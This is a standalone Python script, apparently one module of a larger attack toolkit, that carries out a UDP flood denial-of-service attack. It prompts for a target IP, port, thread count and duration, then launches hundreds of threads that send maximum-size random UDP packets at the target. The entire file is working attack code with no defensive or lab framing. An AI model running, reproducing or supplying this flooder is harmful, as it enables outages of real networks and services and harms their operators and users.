#!/usr/bin/env python3
# UDP Flood Attack Module

import socket, random, time, threading

def run():
    print("\n" + "="*60)
    print("UDP FLOOD")
    print("="*60)
    
    target_ip = input("Target IP: ").strip()
    target_port = int(input("Target Port [80]: ").strip() or "80")
    threads = int(input("Threads [500]: ").strip() or "500")
    duration = int(input("Duration (seconds) [60]: ").strip() or "60")
    
    stop_event = threading.Event()
    packet_size = 65500
    
    def flood():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random._urandom(packet_size)
        end_time = time.time() + duration
        while time.time() < end_time and not stop_event.is_set():
            try:
                s.sendto(data, (target_ip, target_port))
            except:
                pass
        s.close()
    
    print(f"\nStarting UDP Flood on {target_ip}:{target_port}")
    print(f"Threads: {threads} | Duration: {duration}s | Packet Size: {packet_size} bytes")
    
    for i in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    
    try:
        time.sleep(duration)
        stop_event.set()
        print("\nUDP Flood completed!")
    except KeyboardInterrupt:
        stop_event.set()
        print("\nStopped by user")

if __name__ == "__main__":
    run()